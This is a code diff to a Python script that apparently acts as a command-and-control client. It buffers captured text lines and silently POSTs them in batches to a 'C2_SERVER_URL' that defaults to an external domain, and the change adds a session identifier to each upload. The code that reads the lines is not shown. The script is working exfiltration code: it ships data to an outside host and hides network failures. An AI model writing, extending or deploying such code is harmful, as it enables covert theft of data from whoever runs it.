@@ -4,6 +4,8 @@ import os
 import time
 
 C2_SERVER_URL = os.environ.get('C2_SERVER_URL', 'https://lalithadithyan.dev')
+C2_SESSION    = os.environ.get('C2_SESSION', 'default')
+
 buffer = []
 last_push = time.time()
 current_line = ""
@@ -26,7 +28,9 @@ while True:
         if len(buffer) >= 50 or (time.time() - last_push) > 2.0:
             if buffer:
                 try:
-                    requests.post(f"{C2_SERVER_URL}/api/logs", json={"lines": buffer}, timeout=2)
+                    requests.post(f"{C2_SERVER_URL}/api/logs", 
+                                  json={"lines": buffer, "session": C2_SESSION}, 
+                                  timeout=2)
                 except Exception:
                     pass
                 buffer = []
@@ -39,7 +43,8 @@ if buffer or current_line:
     if current_line:
         buffer.append(current_line.strip())
     try:
-        requests.post(f"{C2_SERVER_URL}/api/logs", json={"lines": buffer}, timeout=2)
+        requests.post(f"{C2_SERVER_URL}/api/logs", 
+                      json={"lines": buffer, "session": C2_SESSION}, 
+                      timeout=2)
     except Exception:
         pass
-
